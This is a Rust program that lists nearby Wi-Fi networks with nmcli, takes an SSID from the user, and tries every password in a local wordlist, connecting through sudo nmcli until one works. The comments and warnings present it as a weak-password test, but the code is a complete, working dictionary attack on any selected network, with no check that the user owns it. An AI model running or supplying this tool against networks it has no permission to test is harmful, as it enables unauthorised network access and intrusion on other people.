use std::fs::File;
use std::io::{self, Write};
use std::io::{BufRead, BufReader};
use std::process::{exit, Command};

fn main() {
    println!("Scanning for available Wi-Fi networks...\n");
    let output = Command::new("nmcli")
        .arg("device")
        .arg("wifi")
        .arg("list")
        .output()
        .expect("Failed to execute nmcli");

    if !output.status.success() {
        let error_message = String::from_utf8_lossy(&output.stderr);
        eprintln!("Error: Scan failed: {}", error_message);
        exit(1);
    }

    let available_networks = String::from_utf8_lossy(&output.stdout);
    println!("Available networks:\n{}", available_networks);

    // Get the Wi-Fi SSID from the user
    let mut ssid = String::new();
    print!("Enter SSID to test: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut ssid).unwrap();
    let ssid = ssid.trim();

    // Load the list of weak passwords from the file
    let password_file = "src/passwordList.txt"; // Common weak passwords file
    let password_list = File::open(password_file).expect("Failed to open password list.");
    let reader = BufReader::new(password_list);

    let mut attempts = 0;

    println!("\nStarting brute-force test for SSID: {}...\n", ssid);

    // Loop through each password in the password list
    for line in reader.lines() {
        let password = line.unwrap().trim().to_string();
        attempts += 1;

        println!("Trying password [{}]: {}", attempts, password);

        // Check if the connection already exists for the SSID
        let connection_check_output = Command::new("nmcli")
            .arg("connection")
            .arg("show")
            .arg(ssid)
            .output()
            .expect("Failed to check connection.");

        if !connection_check_output.status.success() {
            // Create a new connection if it doesn't exist
            let create_output = Command::new("sudo")
                .arg("nmcli")
                .arg("dev")
                .arg("wifi")
                .arg("connect")
                .arg(ssid)
                .arg("password")
                .arg(&password)
                .output()
                .expect("Failed to create Wi-Fi connection.");

            if create_output.status.success() {
                println!("\nSuccess! Weak password found: {}", password);
                println!("WARNING: Use strong Wi-Fi passwords.");
                exit(0);
            } else {
                // Return a simple error message
                println!("Incorrect password.");
            }
        } else {
            // If connection exists, modify the existing connection to update the password
            let modify_output = Command::new("sudo")
                .arg("nmcli")
                .arg("connection")
                .arg("modify")
                .arg(ssid)
                .arg("wifi-sec.psk")
                .arg(&password)
                .output()
                .expect("Failed to modify connection.");

            if modify_output.status.success() {
                // Try to connect using the updated password
                let connect_output = Command::new("sudo")
                    .arg("nmcli")
                    .arg("connection")
                    .arg("up")
                    .arg(ssid)
                    .output()
                    .expect("Failed to connect.");

                if connect_output.status.success() {
                    println!("\nSuccess! Weak password found: {}", password);
                    println!("WARNING: Use strong Wi-Fi passwords.");
                    exit(0);
                } else {
                    // Return a simple error message
                    println!("Incorrect password.");
                }
            } else {
                // Return a simple error message
                println!("Incorrect password.");
            }
        }
    }

    println!("\nNo weak password found. Use stronger passwords to secure your Wi-Fi.");
}
